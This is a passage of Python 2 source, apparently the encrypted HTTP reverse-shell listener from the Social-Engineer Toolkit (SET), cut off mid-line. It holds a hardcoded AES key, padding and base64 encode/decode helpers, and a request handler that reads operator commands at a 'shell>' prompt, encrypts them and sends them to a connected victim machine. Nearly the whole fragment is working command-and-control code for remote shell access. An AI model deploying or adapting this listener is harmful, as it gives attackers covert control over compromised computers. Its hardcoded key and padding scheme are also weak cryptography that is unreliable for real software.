
BLOCK_SIZE = 32
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
secret = "(3j^%sh@hd3hDH2u3h@*!~h~2&^lk<!L"
cipher = AES.new(secret)
def htc(m):
	return chr(int(m.group(1),16))
def urldecode(url):
	rex=re.compile('%([0-9a-hA-H][0-9a-hA-H])',re.M)
	return rex.sub(htc,url)
class GetHandler(BaseHTTPRequestHandler):
	def do_GET(self):
		message = raw_input("shell> ")
		if message == "quit" or message == "exit":
			print ("\nExiting the SET RevShell Listener... ")
			time.sleep(2)
			sys.exit()
		self.send_response(200)
		self.end_headers()
		message = EncodeAES(cipher, message)
		me